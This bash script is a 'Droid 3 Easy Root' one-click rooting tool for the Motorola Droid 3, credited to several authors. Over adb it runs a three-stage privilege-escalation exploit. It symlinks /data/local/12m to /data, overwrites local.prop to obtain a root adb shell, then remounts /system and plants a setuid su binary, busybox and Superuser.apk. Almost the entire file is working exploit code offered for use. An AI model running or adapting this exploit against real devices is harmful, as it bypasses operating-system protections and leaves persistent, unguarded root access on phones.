#!/bin/bash
#
# Modified from origial script by Framework, psouza4_, method by bliss
#
# http://vulnfactory.org/blog/2011/08/25/rooting-the-droid-3/
#
# Some things from Continuum one-click script by bubby323 (OSX support mainly)
#
# v7a - updated from psouza's v7, added check for already rooted, added check in case root fails
# v7b - attempt to better set up adb on OSX, removed Windows files from package, call for pc only mode
# v7c - rework platform detection/adb setup, handle case where system adb is installed
#       This is what I get for copying bubby323's script.  Sigh.
# v7d - document charge mode for mac, remove initial kill-server

if [ ! -f busybox -o ! -f su -o ! -f Superuser.apk ]
then
    cat <<_EOF
! Error
!
! You must extract the entire contents of the zip file and then run this script
! from the directory where the zip was extracted.
_EOF
    exit 1
fi

platform=`uname`
if [ $(uname -p) = 'powerpc' ]; then
    echo "Sorry, this won't work on PowerPC machines."
    exit 1
fi
which adb > /dev/null 2>&1
if [ $? -eq 1 ]; then
    if [ "$platform" = 'Darwin' ]; then
        adb="./adb.osx"
    else
        adb="./adb.linux"
    fi
    chmod +x $adb
else 
    adb="adb"
fi
$adb kill-server > /dev/null 2>&1
root=$($adb shell su -c id | grep uid=0)
if [ ! -z "$root" ]; then
    cat <<_EOF
* 
* Hey wierdo, your phone is already rooted.
*
_EOF
    exit 1;
fi
cat <<_EOF
***************************************************************************
*                                                                         *
*                       DROID 3 Easy Root script v7d                      *
*                                                                         *
***************************************************************************
*
* Please make sure you meet these pre-requisites:
*
*       (a) install the correct driver... er, nevermind, we don't need no stinkin' drivers
*       (b) turn on USB debugging (on your phone under Settings -> Applications)
*       (c) plug in your phone and set your USB mode to 'PC Mode' (on Linux)
*                                             or 'Charge Only' mode (on Mac)
*           (but if it hangs waiting for the phone to connect, set it the other way)
*
* READY TO ROOT YOUR DROID 3 WHEN YOU ARE!
*
_EOF
read -n1 -s -p "* Press enter to continue..."
cat <<_EOF

*
* Waiting for your phone to be connected...
*
_EOF
$adb wait-for-device
$adb wait-for-device
echo "* Running exploit [part 1 of 3]..."
$adb shell "if [ -e /data/local/12m.bak ]; then rm /data/local/12m.bak; fi"
$adb shell mv /data/local/12m /data/local/12m.bak
$adb shell ln -s /data /data/local/12m
$adb reboot

cat <<_EOF
*
* Rebooting the phone... when the reboot is complete, you may need to unlock the phone to continue.
*
_EOF

$adb kill-server
$adb wait-for-device
$adb wait-for-device
echo "* Running exploit [part 2 of 3]..."
$adb shell rm /data/local/12m
$adb shell mv /data/local/12m.bak /data/local/12m
$adb shell "if [ -e /data/local.prop.bak ]; then rm /data/local.prop.bak; fi"
$adb shell mv /data/local.prop /data/local.prop.bak
$adb shell 'echo "ro.sys.atvc_allow_netmon_usb=0" > /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_netmon_ih=0" > /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_res_core=0" >> /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_res_panic=0" >> /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_all_adb=1" >> /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_all_core=0" >> /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_efem=0" >> /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_bp_log=0" >> /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_ap_mot_log=0" >> /data/local.prop'
$adb shell 'echo "ro.sys.atvc_allow_gki_log=0" >> /data/local.prop'
$adb reboot

cat <<_EOF
*
* Rebooting the phone... when the reboot is complete, you may need to unlock the phone to continue.
*
_EOF

$adb kill-server
$adb wait-for-device
$adb wait-for-device
root=$($adb shell id | grep uid=0)
if [ -z "$root" ]; then
    cat <<_EOF
! ERROR: root was not obtained.
!
! You might want to try rebooting your phone and trying again.
_EOF
    exit 1;
fi
echo "* Running exploit [part 3 of 3]..."

$adb remount
$adb push busybox /system/xbin/busybox
$adb push su /system/xbin/su
$adb install Superuser.apk 
$adb shell chmod 4755 /system/xbin/su
$adb shell chmod 755 /system/xbin/busybox
$adb shell /system/xbin/busybox --install -s /system/xbin/
$adb shell ln -s /system/xbin/su /system/bin/su
$adb shell chown system.system /data

cat << _EOF
*
* ALL DONE!  YOUR PHONE SHOULD BE ROOTED!
*
******************************************************************************

_EOF
